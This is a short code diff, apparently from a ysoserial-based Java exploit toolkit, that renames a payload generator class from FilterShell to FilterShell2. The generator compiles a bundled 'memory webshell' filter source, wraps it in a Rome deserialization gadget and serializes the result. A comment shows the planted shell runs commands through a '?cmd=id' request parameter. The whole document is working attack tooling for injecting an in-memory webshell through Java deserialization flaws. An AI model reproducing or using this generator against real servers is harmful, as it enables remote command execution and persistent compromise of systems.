@@ -9,16 +9,16 @@ import ysoserial.payloads.util.ReadWrite;
 
 
 //filter 内存马 /1nhann?cmd=id
-public class FilterShell {
+public class FilterShell2 {
     public static void main(final String[] args) throws Exception {
-        Object evil = new FilterShell().getObject(RomeTools.class);
+        Object evil = new FilterShell2().getObject(RomeTools.class);
         byte[] ser = Serializer.serialize(evil);
     }
 
     public Object getObject(Class gadget) throws Exception {
-        byte[] bytes = ReadWrite.readResource(FilterShell.class, "内存马/filter/FilterShell.java");
+        byte[] bytes = ReadWrite.readResource(FilterShell2.class, "内存马/filter/FilterShell2.java");
         String java = new String(bytes);
-        byte[] b = JavaCompiler.compile("FilterShell",java);
+        byte[] b = JavaCompiler.compile("FilterShell2",java);
         Class c = ClassFiles.bytesAsClass(b);
         Object o = new Eval().getObject(gadget,c);
         return o;
